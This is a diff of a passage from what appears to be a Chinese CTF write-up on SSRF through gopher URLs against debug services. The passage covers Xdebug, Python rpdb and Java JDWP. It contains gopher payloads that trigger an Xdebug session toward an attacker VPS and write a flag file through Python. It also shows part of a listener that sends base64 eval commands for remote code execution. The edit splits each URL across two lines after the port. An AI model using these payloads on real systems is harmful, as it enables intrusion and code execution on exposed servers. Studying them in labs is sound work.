@@ -57,7 +57,8 @@ while True:
 
 通过gopher构造get请求的原始数据
 
-gopher://127.0.0.1:7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A
+gopher://127.0.0.1:
+7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A
 
 vps接着收到了信息；然后可以system("ls / |base64 -w 0")执行任意代码了。
 
@@ -73,7 +74,8 @@ rpdb扩展了pdb，让pdb支持远程调试功能。
 
 我们可以直接通过gopher攻击python把flag写入到/tmp/，然后直接通过file协议读取文件。
 
-gopher://127.0.0.1:4444/_open("/tmp/python_flag","w").write(fl1l1l1l1laaggg)
+gopher://127.0.0.1:
+4444/_open("/tmp/python_flag","w").write(fl1l1l1l1laaggg)
 
 java JDWP RCE
 
@@ -124,12 +126,8 @@ while True:
 
     data = raw_input('>> ')
     conn.sendall('eval -i 1 -- %sx00' % data.encode('base64'))
-```
-
-
-
-```
-gopher://127.0.0.1:7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A
+gopher://127.0.0.1:
+7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A
 ```
 
 
